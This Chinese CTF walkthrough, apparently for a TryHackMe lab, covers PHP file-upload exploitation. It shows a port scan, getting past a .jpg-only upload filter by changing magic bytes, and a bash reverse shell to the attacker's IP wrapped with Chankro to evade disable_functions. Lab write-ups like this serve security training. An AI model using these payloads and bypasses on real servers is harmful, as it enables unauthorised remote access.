---
sidebar_position: 2
tags: [Easy, Linux, 文件上传]
title: Bypass Disable Functions
description: 在 PHP 文件上传时遇到函数限制如何绕过
---
# Bypass Disable Functions
## 端口扫描
```bash
root@ip-10-10-239-179:~# rustscan -a 10.10.12.68 -r 1-65535 -t 1000 -u 1000 -- -sT
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 1000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.12.68:22
Open 10.10.12.68:80
```
## 80
经过简单的查询我们发现了一个文件上传的位置：

![20240525004016](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004016.png)

我们来下载一个反向 SHELL 文件， 下载到本地后， 开启我们的 Burp, 进行拦截发包， 经过测试发现只能上传 `.jpg` 文件， 此时我们需要绕过后端过滤, 经过查询后发现修改文件幻数就可以绕过检测

![20240525004030](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004030.png)

现在我们来查找一下对应的上传位置, 发现文件上传位置， 我们进行访问

![20240525004044](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004044.png)

我们来访问我们的文件可以发现获取到 SHELL  但是马上关闭， 我们查看房间， 了解到需要做一些规避

首先根据提示内容， 我们需要先找到对应服务器的路径， 在目录遍历时， 我们发现了一个 `phpinfo()` 在此我们可以找到对于服务器路径

![20240525004059](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004059.png)

然后我们下载对应的文件以及对应的 payload 来生成我们的 rev.php
```bash
$ cat rev.sh                                                                                    ✔ 
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.13.31.216/4444 0>&1
$ python2 chankro.py --arch 64 --input rev.sh --output rev.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db


     -=[ Chankro ]=-
    -={ @TheXC3LL }=-


[+] Binary file: rev.sh
[+] Architecture: x64
[+] Final PHP: rev.php


[+] File created!
```
按照前面的思路再次将文件上传上去之后， 在本地开启监听进行检测

![20240525004131](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004131.png)

